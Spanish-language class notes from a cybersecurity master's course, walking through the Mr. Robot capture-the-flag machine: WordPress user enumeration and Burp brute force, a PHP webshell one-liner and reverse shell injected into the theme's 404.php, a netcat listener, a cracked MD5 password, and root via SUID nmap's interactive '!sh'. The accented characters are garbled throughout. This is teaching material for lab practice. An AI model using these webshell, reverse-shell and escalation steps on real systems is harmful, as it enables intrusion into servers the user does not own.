> [!info] Ficha tÃ©cnica
> **MÃ¡ster de Ciberseguridad e Inteligencia Artificial** Â· **Clase 35**
> **MÃ³dulo:** MODULO3
> **Tema:** Clase 35
> **Fuente:** Apuntes Joselu Â· Evolve Academy

> [!tip] CÃ³mo leer estos apuntes
> Resumen estructurado de la clase 35. Contenido optimizado para estudio activo y repaso rÃ¡pido antes de exÃ¡menes.

---

---

Robot -- WordPress, File Upload, Reverse Shell y SUID en Nmap

--
**MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy**

## 1.

Contexto y estructura de la sesiÃ³n

Esta sesiÃ³n la imparte **Carlos Castillo** y cierra la mÃ¡quina **Mr.

Robot** de principio a fin.

Es un salto conceptual importante respecto a lo visto hasta ahora: primera vez con un CMS real (WordPress), introducciÃ³n del file upload como vector ofensivo desde un panel autenticado, y escalada de privilegios mediante un binario con SUID documentado en GTFOBins.

La sesiÃ³n tambiÃ©n sirve de repaso conceptual profundo sobre **bind shell vs.Â reverse shell**, y sobre por quÃ© el file upload es una de las vulnerabilidades mÃ¡s frecuentes y rentables en auditorÃ­as reales.

**Caso real:** Carlos cobrÃ³ **5.000â‚¬ en un bug bounty** por una vulnerabilidad de este tipo en la foto de perfil de la **app de Starbucks**.

Lo que parece una tonterÃ­a hasta que te pagan cinco mil euros.

## 2.

File Upload --- Marco conceptual antes de entrar en la mÃ¡quina

Cuando una web tiene un formulario de subida de ficheros, el servidor puede tener tres comportamientos:

Comportamiento DescripciÃ³n Seguridad
 -------------------- ---------------------------------- -------------------------------
 **Sin validaciÃ³n** Acepta cualquier extensiÃ³n Lo mÃ¡s comÃºn y peligroso
 **Blacklist** Rechaza extensiones prohibidas InÃºtil --- siempre hay bypass
 **Whitelist** Solo acepta extensiones listadas La Ãºnica aproximaciÃ³n correcta

### Las dos condiciones para RCE

Subir un fichero no es suficiente.

Para que el ataque funcione hacen falta **dos condiciones simultÃ¡neas**:

1. **El fichero debe ser accesible desde el navegador** (ruta conocida o descubrible). 2. **El servidor debe interpretar el cÃ³digo**, no servirlo como texto.

Un PHP accesible en un servidor Apache se ejecuta automÃ¡ticamente al cargarlo, sin necesidad de permisos de ejecuciÃ³n explÃ­citos en el sistema de ficheros.

**La regla general de lenguajes:** - **Apache + Linux â†’ PHP** - **IIS + Windows â†’ ASP.NET**

Subir una shell en el lenguaje equivocado produce un fichero inÃºtil que el servidor sirve como texto plano.

**MetÃ¡fora:** subir un fichero malicioso sin que se ejecute es como colar una pistola en un edificio donde nadie sabe usarla.

El peligro llega cuando el servidor la dispara, es decir, cuando interpreta el cÃ³digo.

## 3.

EnumeraciÃ³n y reconocimiento de Mr.

Robot

La mÃ¡quina expone un **WordPress** en el puerto 80.

**Herramienta de fingerprinting:** `whatweb http://IP` --- detecta tecnologÃ­as del servidor (Apache, versiÃ³n de PHP, CMS, etc.).

Equivalente a Wappalyzer pero desde terminal.

### Information disclosure en el login de WordPress

El login de WordPress tiene una vulnerabilidad clÃ¡sica de **information disclosure**: - Si el usuario **no existe** â†’ mensaje: "*Invalid username*" - Si el usuario **existe** pero la contraseÃ±a es incorrecta â†’ mensaje: "*The password you entered for the username X is incorrect*"

Esta diferencia de mensajes permite **enumerar usuarios vÃ¡lidos** sin conocer ninguna contraseÃ±a, convirtiendo una fuerza bruta ciega en una fuerza bruta dirigida.

## 4.

Fuerza bruta con Burp Suite Intruder

### Fase 1 --- Enumerar el usuario vÃ¡lido

**Flujo:** 1.

Activar FoxyProxy â†’ interceptar una peticiÃ³n de login fallida con Burp. 2.

En Burp: **Proxy â†’ HTTP History â†’ clic derecho â†’ Send to Intruder**. 3.

Modo: **Sniper Attack**. 4.

Seleccionar el **campo del nombre de usuario** como posiciÃ³n del payload (marcarlo entre `Â§usuarioÂ§`). 5.

Dejar una contraseÃ±a arbitraria fija. 6.

En **Payloads**: aÃ±adir manualmente nombres de la serie + clÃ¡sicos: - `Elliot`, `Tyrell`, `Darlene`, `Angela`, `fsociety`, `admin`, `administrator`, `root` 7. **Start Attack** â†’ observar la **columna Length** de las respuestas.

Todas las peticiones con "Invalid username" tienen la misma longitud.

Cualquier desviaciÃ³n indica el mensaje diferente â†’ **usuario existe**.

**Usuario encontrado:** `elliot`

### Fase 2 --- Romper la contraseÃ±a

Con el usuario confirmado, repetir el proceso con el **campo de contraseÃ±a** como payload:

**Preparar el diccionario limpio:**

sort diccionario.txt | uniq > diccionario_clean.txt

# Resultado: ~11.452 lÃ­neas Ãºnicas

Cargar `diccionario_clean.txt` como payload y lanzar el ataque.

**Identificar la peticiÃ³n exitosa:** - Login incorrecto â†’ respuesta con cÃ³digo 302 + mismo tamaÃ±o que las demÃ¡s. - **Login correcto** â†’ respuesta con tamaÃ±o diferente + **cookie de WordPress** en el response (que indica que el login ha tenido Ã©xito).

**Nota sobre Intruder:** Burp Intruder aÃ±ade **delays aleatorios** entre peticiones de forma intencionada para no generar un patrÃ³n constante de trÃ¡fico que los sistemas de detecciÃ³n puedan identificar como fuerza bruta.

> [!important] **Idea clave:** los mensajes de error de formularios de login son informaciÃ³n.

Si el servidor distingue entre "usuario no existe" y "contraseÃ±a incorrecta", estÃ¡ confirmando la existencia de usuarios.

Eso se llama **information disclosure**.

## 5.

ExplotaciÃ³n de WordPress autenticado --- File Upload

Una vez dentro del panel de administraciÃ³n de WordPress, hay **tres vÃ­as** para conseguir ejecuciÃ³n de cÃ³digo:

### VÃ­a 1 --- WP File Manager (plugin)

Instalar el plugin **WP File Manager** desde el repositorio oficial de WordPress (Plugins â†’ Add New â†’ buscar "file manager" â†’ Install Now â†’ Activate).

Una vez activo, permite navegar y **subir ficheros directamente al servidor**, incluyendo webshells PHP, sin modificar ficheros existentes.

**Nota de Carlos:** aunque el plugin viene del repo oficial de WordPress, eso no garantiza seguridad.

Ha encontrado decenas de 0-days en plugins "validados" por WordPress.

### VÃ­a 2 --- Editor de plantillas (la usada en clase)

WordPress permite editar directamente el PHP de las plantillas del tema activo:

**Appearance â†’ Theme Editor (o Editor) â†’ seleccionar** `404.php`

La plantilla del error 404 es ideal porque se puede ejecutar navegando a cualquier URL inexistente.

**Paso 1 --- Webshell bÃ¡sica:** Se borra el contenido de la plantilla y se sustituye por:

<?php echo shell_exec($_GET['cmd']); ?>

Acceso: navegar a `http://IP/wp-content/themes/TEMA/404.php?cmd=whoami`

**Paso 2 --- Reverse shell completa:** Se sustituye la webshell por el contenido de `/usr/share/webshells/php/php-reverse-shell.php` de Kali, modificando dos campos:

```bash
$ip = 'NUESTRA_IP'; // IP del atacante (ifconfig) $port = 4444; // Puerto que se pondrÃ¡ a la escucha
```

## 6.

Bind Shell vs.

Reverse Shell --- DistinciÃ³n definitiva

Bind Shell Reverse Shell
 -------------------- -------------------------------------------- --------------------------------------------
 **QuiÃ©n inicia** El atacante se conecta a la vÃ­ctima La vÃ­ctima se conecta al atacante
 **Puerto abierto** En la vÃ­ctima En el atacante
 **Requiere** Acceso al puerto de la vÃ­ctima desde fuera RCE previo para ejecutar el cÃ³digo saliente
 **AnalogÃ­a** TÃº llamas a la puerta de alguien Alguien llama a tu puerta

**Netcat como listener (para reverse shell):**

nc -lvnp 4444

- `-l` â†’ modo escucha (listen)
- `-v` â†’ verbose (muestra lo que pasa)
- `-n` â†’ sin resoluciÃ³n DNS
- `-p` â†’ puerto

**La analogÃ­a del repartidor de Amazon:** si no estÃ¡s esperando el paquete en casa (no tienes un listener), aunque el repartidor llame (la vÃ­ctima intenta conectarse) no hay nadie que abra la puerta.

El listener es el portero que espera la conexiÃ³n.

## 7.

Reverse Shell --- ObtenciÃ³n y resultado

Con Netcat escuchando en el puerto 4444:

nc -lvnp 4444

Al navegar a `http://IP/wp-content/themes/TEMA/404.php` â†’ la pÃ¡gina se queda cargando indefinidamente (estÃ¡ ejecutando el PHP) â†’ en el listener de Netcat llega la conexiÃ³n.

**Usuario obtenido:** `daemon` --- la cuenta de servicio del servidor web en esta mÃ¡quina.

## 8.

### Movimiento lateral: daemon â†’ robot

Una vez dentro como `daemon`, enumerar el directorio home de `robot`:

```bash
cat /home/robot/password.raw-md5
```

# Resultado: robot:c3fcd3d76192e4007dfb496cca67e13b

El fichero tiene **permisos de lectura para otros usuarios**, lo que permite leerlo sin ser `robot`.

El hash es **MD5**.

CrackStation lo rompe instantÃ¡neamente porque estÃ¡ en sus **rainbow tables** (base de datos precalculada de pares textoâ†’hash).

**ContraseÃ±a:** `abcdefghijklmnopqrstuvwxyz`

su robot

# ContraseÃ±a: abcdefghijklmnopqrstuvwxyz

whoami # â†’ robot cat /home/robot/key-2-of-3.txt # â†’ USER FLAG

## 9.

Escalada de privilegios: robot â†’ root (SUID en nmap)

### Paso 1 --- sudo -l no devuelve nada Ãºtil

```bash
sudo -l
```

# â†’ "Sorry, user robot may not run sudo on linux."

Sin vector de sudo.

### Siguiente opciÃ³n: buscar binarios con **bit SUID**.

### Paso 2 --- Buscar binarios SUID

find / -perm -u=s -type f 2>/dev/null

**Desglose del comando:** - `find /` â†’ busca desde la raÃ­z del sistema. - `-perm -u=s` â†’ busca ficheros con el bit SUID activado (cÃ³digo octal 4000). - `-type f` â†’ solo ficheros (no directorios). - `2>/dev/null` â†’ redirige stderr (la columna 2 de salida, que son los errores de permisos) a `/dev/null`, descartÃ¡ndolos silenciosamente.

**Hallazgo inusual:** `/usr/local/bin/nmap` tiene SUID y el propietario es root.

Nmap **no deberÃ­a tener SUID**.

Esto indica que algÃºn administrador lo configurÃ³ mal o que la mÃ¡quina fue diseÃ±ada con esta vulnerabilidad.

### Paso 3 --- GTFOBins: explotar nmap interactivo

En **GTFOBins** (gtfobins.github.io), buscando `nmap` con el filtro `SUID`:

Las versiones antiguas de nmap (2.02 a 5.21) tienen un **modo interactivo** que permite ejecutar comandos del sistema:

```bash
nmap --interactive
```

# Dentro del prompt interactivo de nmap:

!sh whoami # â†’ root

**Por quÃ© funciona:** el `!` en el modo interactivo de nmap ejecuta comandos del sistema.

Como nmap se ejecuta con SUID y su propietario es root, la shell que se lanza **hereda los privilegios de root**.

```bash
cat /root/key-3-of-3.txt # â†’ ROOT FLAG
```

> [!important] **Idea clave:** el bit SUID en un binario significa que quien lo ejecute lo harÃ¡ con los privilegios del propietario del fichero, no con los suyos propios.

Si el propietario es root y ese binario permite ejecutar comandos o abrir una shell, cualquier usuario del sistema puede convertirse en root.

GTFOBins documenta exactamente cÃ³mo hacerlo para decenas de binarios.

## 10.

Truco de Linux: copiar con la rueda del ratÃ³n

Mencionado en clase y muy Ãºtil:

En Linux, **seleccionar texto con el ratÃ³n + clic con la rueda central** pega automÃ¡ticamente el texto seleccionado en el cursor.

No hace falta Ctrl+C / Ctrl+V.

Ahorra tiempo en la terminal durante auditorÃ­as.

## 11.

Flujo completo de la mÃ¡quina Mr.

Robot

Nmap â†’ puerto 80 (WordPress) â†“ WhatWeb / Wappalyzer â†’ tecnologÃ­as del servidor â†“ Login WordPress â†’ informaciÃ³n disclosure:
 - "Invalid username" vs "contraseÃ±a incorrecta"
â†“ Burp Suite Intruder (Sniper) + lista de usuarios â†’ elliot encontrado Burp Suite Intruder (Sniper) + diccionario limpio â†’ contraseÃ±a encontrada â†“ Login como elliot â†’ panel admin WordPress â†“ Appearance â†’ Theme Editor â†’ 404.php â†’ Sustituir por webshell PHP: <?php echo shell_exec($_GET['cmd']); ?> â†’ Confirmar RCE: http://IP/.../404.php?cmd=whoami â†’ daemon â†“ Sustituir 404.php por php-reverse-shell.php (IP + puerto propios) nc -lvnp 4444 â†’ navegar al 404.php â†’ reverse shell como daemon â†“ cat /home/robot/password.raw-md5 â†’ hash MD5 CrackStation â†’ abcdefghijklmnopqrstuvwxyz su robot â†’ USER FLAG (key-2-of-3.txt) â†“ sudo -l â†’ sin permisos find / -perm -u=s -type f 2>/dev/null â†’ /usr/local/bin/nmap con SUID â†“ nmap --interactive â†’ !sh â†’ root cat /root/key-3-of-3.txt â†’ ROOT FLAG

## 12.

Conceptos y tÃ©rminos clave corregidos

TÃ©rmino en la transcripciÃ³n CorrecciÃ³n / AclaraciÃ³n
 --------------------------------------------- -----------------------------------------------------------------------------------------------------
 *Mister Robot / Mr robot* **Mr.

Robot** -- mÃ¡quina HTB basada en la serie de TV del mismo nombre
 *lujin Tokoto / WordPress lujin* **WordPress login** -- panel de acceso de WordPress (`/wp-login.php`)
 *Hater Trix / HubTrix / Hate Trix* **HackTricks** (book.hacktricks.xyz) -- referencia metodolÃ³gica por protocolo
 *Wap Web / Wap Palaiser / Wapalaisher* **WhatWeb** / **Wappalyzer** -- herramientas de fingerprinting de tecnologÃ­as web
 *Foxy Proxy / Foxy Proxi* **FoxyProxy** -- extensiÃ³n para activar/desactivar el proxy de Burp con un clic
 *BugÃº / Burp suit* **Burp Suite** -- proxy de interceptaciÃ³n para auditorÃ­as web
 *Sniper Attack / Status Attack* **Sniper Attack** -- modo del Intruder de Burp que prueba un payload en una posiciÃ³n
 *WP file manager / File Manager* **WP File Manager** -- plugin de WordPress que permite subir ficheros al servidor
 *lujin tokoto / el 404 de WordPress* **404.php** -- plantilla del error 404 en WordPress, usada para inyectar la shell
 *bin Shell / webshell* **Webshell** -- PHP que ejecuta comandos del servidor vÃ­a parÃ¡metro URL (`?cmd=`)
 *rever Shell / reverse sel* **Reverse shell** -- el servidor se conecta activamente al atacante
 *Bind Shell / bind sel* **Bind shell** -- el atacante se conecta a un puerto abierto en la vÃ­ctima
 *NetCAD / Net Card / Netcard* **Netcat (nc)** -- herramienta de comunicaciÃ³n TCP/UDP; usado como listener
 *guiÃ³n l v n p* `nc -lvnp PUERTO` -- comando de Netcat para poner un listener
 *SUID / el bit de la S / los 4000* **Bit SUID** (*Set User ID*) -- hace que el binario se ejecute con los privilegios de su propietario
 *Juan Mai / Juamai / el Juan* `whoami` -- comando que muestra el usuario actual
 *SUO menos L / sudo guiÃ³n l* `sudo -l` -- lista los comandos que el usuario puede ejecutar con privilegios de root
 *2 mayor que devnull / el 2 barra null* `2>/dev/null` -- redirige stderr a `/dev/null` para descartar errores en silencio
 *nmap modo interactivo / el de interactivo* `nmap --interactive` -- modo de nmap (versiones 2.02-5.21) que permite ejecutar comandos con `!`
 *exclamaciÃ³n SH / el de nmap* `!sh` -- comando dentro del modo interactivo de nmap que lanza una shell
 *GTFOBins / GTF o BINS* **GTFOBins** (gtfobins.github.io) -- referencia de tÃ©cnicas de escalada por binarios del sistema
 *Robotito / el usuario robot* **robot** -- usuario de la mÃ¡quina Mr.

Robot con el hash MD5 en texto plano
 *Daemon / Deemon* **daemon** -- cuenta de servicio del servidor web obtenida tras la reverse shell
 *CrackStation / Crack Station* **CrackStation** (crackstation.net) -- base de datos precalculada de hashes (rainbow tables)
 *Rainbow tables / tablas arcoÃ­ris* **Rainbow tables** -- tablas precalculadas de pares textoâ†’hash para cracking instantÃ¡neo
 *Claudio / Claudia / la API de Atrofing* **Claude** (Anthropic) -- IA usada por los alumnos para resolver dudas durante la clase
 *Bounting / bounty* **Bug bounty** -- programa de recompensas por encontrar vulnerabilidades en sistemas reales
 *Key uno / key dos / key tres* **key-1-of-3.txt, key-2-of-3.txt, key-3-of-3.txt** -- las tres flags de la mÃ¡quina Mr.

Robot

*Resumen elaborado para uso acadÃ©mico en el MÃ¡ster de Ciberseguridad e Inteligencia Artificial -- Evolve Academy.*

â†’

â†’


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../transcripciones/Julio/09.07.2026 Owasp Top 10 XXE  Labs with Castor.md|09.07.2026 Owasp Top 10 XXE  Labs with Castor]] — Burp Suite, Hack The Box, WordPress
- [[../../transcripciones/Julio/08.07.2026 Owasp Top 10 LFI Fundamentos.md|08.07.2026 Owasp Top 10 LFI Fundamentos]] — Hydra, Metasploit, XXE
- [[../../transcripciones/Julio/14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab).md|14.07.2026 Fundamentos Web y SQL Injection Máquina Injected (HackerLab)]] — File Upload, Hydra, XXE
- [[../../transcripciones/Septiembre/03.09.2026 OWASP API Top 10 La API habla de más.md|03.09.2026 OWASP API Top 10 La API habla de más]] — Hydra, Post-Explotación, XXE
- [[resumen_master_clase30.md|resumen_master_clase30]] — File Upload, Hydra, XXE
- [[../../transcripciones/Junio/16.06.2026 Mr. Robot Explotación Web Completa File Upload, Reverse Shell y SUID Hijacking.md|16.06.2026 Mr. Robot Explotación Web Completa File Upload, Reverse Shell y SUID Hijacking]] — File Upload, Hydra, XXE

### 🛠️ Herramientas

- [[comandos/BurpSuite|Burp Suite]]
- [[comandos/Hydra|Hydra]]
- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]

### 🎯 Vulnerabilidades Relacionadas

- [[Apuntes/06 - Explotacion y Post-Explotacion/Reverse Shells y Post-Explotación.md|Command Injection / RCE]]
- [[Apuntes/05 - Auditoria Web/Path Traversal — 6 Casos y Bypasses.md|Path Traversal / LFI]]
- [[Apuntes/05 - Auditoria Web/XXE — XML External Entity.md|XXE]]

> #burpsuite #command-injection #escalada-privilegios #file-upload #hack-the-box #hydra #ia #kali #lfi #linux #metasploit #netcat #nmap #post-explotacion #redes #reverse-shell #windows #wordpress #xxe
